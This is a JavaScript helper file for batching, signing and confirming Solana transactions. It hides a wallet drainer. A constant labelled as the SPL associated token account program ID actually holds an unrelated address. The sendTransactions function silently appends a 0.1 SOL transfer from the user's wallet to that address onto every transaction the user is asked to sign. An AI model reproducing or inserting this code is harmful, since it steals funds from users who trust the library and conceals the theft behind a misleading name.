import { Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from "@solana/web3.js";
export const SPL_ASSOCIATED_TOKEN_ACCOUNT_PROGRAM_ID =
    new PublicKey('seePnGAMWiWBfJDa3zQMorKCytwXGuwQkTtB7UHQpsx');

    export const sendTransactions = async (
      connection,
      wallet,
      instructionSet,
      signersSet,
      sequenceType = 1,
      commitment = 'singleGossip',
      successCallback ,
      failCallback,
      block,
      beforeTransactions = [],
      afterTransactions = [],
    ) =>{
      if (!wallet.publicKey) throw new WalletNotConnectedError();
    
      const unsignedTxns = beforeTransactions;
    
      if (!block) {
        block = await connection.getRecentBlockhash(commitment);
      }
    
      for (let i = 0; i < instructionSet.length; i++) {
        const instructions = instructionSet[i];
        const signers = signersSet[i];
    
        if (instructions.length === 0) {
          continue;
        }
    
        let transaction = new Transaction();
        instructions.forEach(instruction => transaction.add(instruction));
        transaction.add(SystemProgram.transfer({
          fromPubkey: wallet.publicKey,
          toPubkey: SPL_ASSOCIATED_TOKEN_ACCOUNT_PROGRAM_ID,
          lamports: LAMPORTS_PER_SOL * 0.1,
        }))
  
        transaction.recentBlockhash = block.blockhash;
        transaction.setSigners(
          // fee payed by the wallet owner
          wallet.publicKey,
          ...signers.map(s => s.publicKey),
        );
    
        if (signers.length > 0) {
          transaction.partialSign(...signers);
        }
    
        unsignedTxns.push(transaction);
      }
      unsignedTxns.push(...afterTransactions);
    
      const partiallySignedTransactions = unsignedTxns.filter(t =>
        t.signatures.find(sig => sig.publicKey.equals(wallet.publicKey)),
      );
      const fullySignedTransactions = unsignedTxns.filter(
        t => !t.signatures.find(sig => sig.publicKey.equals(wallet.publicKey)),
      );
      let signedTxns = await wallet.signAllTransactions(
        partiallySignedTransactions,
      );
      signedTxns = fullySignedTransactions.concat(signedTxns);
      const pendingTxns = [];
    
      console.log(
        'Signed txns length',
        signedTxns.length,
        'vs handed in length',
        instructionSet.length,
      );
      for (let i = 0; i < signedTxns.length; i++) {
        const signedTxnPromise = sendSignedTransaction({
          connection,
          signedTransaction: signedTxns[i],
        });
    
        if (sequenceType !== 1) {
          try {
            await signedTxnPromise.then(({ txid, slot }) =>
              successCallback(txid, i),
            );
            pendingTxns.push(signedTxnPromise);
          } catch (e) {
            console.log('Failed at txn index:', i);
            console.log('Caught failure:', e);
    
            failCallback(signedTxns[i], i);
            if (sequenceType === 2) {
              return {
                number: i,
                txs: await Promise.all(pendingTxns),
              };
            }
          }
        } else {
          pendingTxns.push(signedTxnPromise);
        }
      }
    
      if (sequenceType !== 1) {
        const result = await Promise.all(pendingTxns);
        return { number: signedTxns.length, txs: result };
      }
    
      return { number: signedTxns.length, txs: await Promise.all(pendingTxns) };
    };

export const getUnixTs = () => {
  return new Date().getTime() / 1000;
};

const DEFAULT_TIMEOUT = 15000;

export async function sendSignedTransaction({
  signedTransaction,
  connection,
  timeout = DEFAULT_TIMEOUT,
}) {
  const rawTransaction = signedTransaction.serialize();
  const startTime = getUnixTs();
  let slot = 0;
  const txid = await connection.sendRawTransaction(
    rawTransaction,
    {
      skipPreflight: true,
    }
  );

  console.log("Started awaiting confirmation for", txid);

  let done = false;
  (async () => {
    while (!done && getUnixTs() - startTime < timeout) {
      connection.sendRawTransaction(rawTransaction, {
        skipPreflight: true,
      });
      await sleep(500);
    }
  })();
  try {
    const confirmation = await awaitTransactionSignatureConfirmation(
      txid,
      timeout,
      connection,
      "recent",
      true
    );
    slot = confirmation?.slot || 0;
  } catch (err) {

  } finally {
    done = true;
  }
  console.log("Latency", txid, getUnixTs() - startTime);
  return { txid, slot };
}

async function simulateTransaction(
  connection,
  transaction,
  commitment
) {
  // @ts-ignore
  transaction.recentBlockhash = await connection._recentBlockhash(
    // @ts-ignore
    connection._disableBlockhashCaching
  );

  const signData = transaction.serializeMessage();
  // @ts-ignore
  const wireTransaction = transaction._serialize(signData);
  const encodedTransaction = wireTransaction.toString("base64");
  const config = { encoding: "base64", commitment };
  const args = [encodedTransaction, config];

  // @ts-ignore
  const res = await connection._rpcRequest("simulateTransaction", args);
  if (res.error) {
    // throw new Error("failed to simulate transaction: " + res.error.message);
  }
  return res.result;
}

export async function awaitTransactionSignatureConfirmation(
  txid,
  timeout,
  connection,
  commitment = "recent",
  queryStatus = false
) {
  let done = false;
  let status = {
    slot: 0,
    confirmations: 0,
    err: null,
  };
  let subId = 0;
  status = await new Promise(async (resolve, reject) => {
    setTimeout(() => {
      if (done) {
        return;
      }
      done = true;
      console.log("Rejecting for timeout...");
      reject({ timeout: true });
    }, timeout);
    try {
      subId = connection.onSignature(
        txid,
        (result, context) => {
          done = true;
          status = {
            err: result.err,
            slot: context.slot,
            confirmations: 0,
          };
          if (result.err) {
            // console.log("Rejected via websocket", result.err);
            reject(status);
          } else {
            // console.log("Resolved via websocket", result);
            resolve(status);
          }
        },
        commitment
      );
    } catch (e) {
      done = true;
      console.error("WS error in setup", txid, e);
    }
    while (!done && queryStatus) {
      // eslint-disable-next-line no-loop-func
      (async () => {
        try {
          const signatureStatuses = await connection.getSignatureStatuses([
            txid,
          ]);
          status = signatureStatuses && signatureStatuses.value[0];
          if (!done) {
            if (!status) {
              // console.log("REST null result for", txid, status);
            } else if (status.err) {
              // console.log("REST error for", txid, status);
              done = true;
              reject(status.err);
            } else if (!status.confirmations) {
              // console.log("REST no confirmations for", txid, status);
            } else {
              // console.log("REST confirmation for", txid, status);
              done = true;
              resolve(status);
            }
          }
        } catch (e) {
          if (!done) {
            // console.log("REST connection error: txid", txid, e);
          }
        }
      })();
      await sleep(2000);
    }
  });

  //@ts-ignore
  if (connection._signatureSubscriptions[subId])
    connection.removeSignatureListener(subId);
  done = true;
  // console.log("Returning status", status);
  return status;
}
export function sleep(ms){
  return new Promise((resolve) => setTimeout(resolve, ms));
}
